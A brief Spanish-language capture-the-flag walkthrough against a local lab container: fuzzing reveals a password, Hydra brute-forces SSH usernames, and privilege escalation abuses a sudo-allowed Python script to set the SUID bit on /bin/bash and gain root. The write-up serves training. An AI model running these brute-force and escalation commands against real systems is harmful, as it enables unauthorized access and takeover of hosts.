PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos a la web y es una Apache default

-Hacemos fuzzing y encontramos la siguiente ruta:
	index.php
	-Al entrar nos encontramos este texto:
		JIFGHDS87GYDFIGD

-Parece ser una contraseña, hacemos ataque de fuerza bruta con hydra para buscar posibles usuarios:
	-hydra ssh://172.17.0.2 -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD
	-User: carlos -Password: JIFGHDS87GYDFIGD

-Nos autenticamos por ssh:
	ssh carlos@172.17.0.2
	-password: JIFGHDS87GYDFIGD
	carlos@4785fbbc3802:~$


## Escalada de Privilegios

carlos@4785fbbc3802:~$ sudo -l
	(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py

-Vemos los permisos del archivo:
	-ls -la /opt/script.py
		-rx-rwxr-x 1 carlos root 314 Feb 11 13:12 /opt/script.py

-Le damos permisos de escritura:
	-chmod +w /opt/script.py

-Editamos el archivo /opt/script.py:
	-Importamos la librería 'os':
		import os
	-Le damos perisos SUID a la /bin/bash
		-os.system("chmod +s /bin/bash")

-Ejecutamos el script como root:
	-sudo /usr/bin/python3 /opt/script.py

-Vemos que los permisos de la /bin/bash han cambiado:
	-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash

-Elevamos nuestra shell:
	carlos@4785fbbc3802:~$ bash -p
	bash-5.2# whoami
	root